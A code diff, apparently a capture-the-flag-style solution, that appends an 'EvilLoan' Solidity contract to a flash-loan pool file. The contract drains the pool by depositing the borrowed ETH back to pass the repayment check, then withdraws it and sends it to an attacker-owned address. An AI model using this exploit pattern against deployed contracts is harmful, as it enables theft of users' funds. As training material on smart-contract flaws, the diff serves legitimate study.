@@ -30,11 +30,35 @@ contract SideEntranceLenderPool {
         uint256 balanceBefore = address(this).balance; // check alance of pool
         require(balanceBefore >= amount, "Not enough ETH in balance"); // check against borrow amount
 
-        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}(); // the contract that ask for the loan must have a receiver function.
 
         require(
             address(this).balance >= balanceBefore,
             "Flash loan hasn't been paid back"
         ); // required that the balance borrowed is repayed.
     }
+}
+
+contract EvilLoan {
+    using Address for address payable;
+    SideEntranceLenderPool pool;
+    address owner;
+
+    constructor(SideEntranceLenderPool _pool, address _owner) {
+        pool = _pool;
+        owner = _owner;
+    }
+
+    function execute() external payable {
+        // deposit everything received back into the pool.
+        pool.deposit{value: msg.value}();
+    }
+
+    function loan() external {
+        pool.flashLoan(address(pool).balance); // initiate loan
+        pool.withdraw(); // withdraw from pool
+        payable(owner).sendValue(address(this).balance); // send to attacker
+    }
+
+    receive() external payable {} // a contract needs this to receive ETH (or fallback)
 }
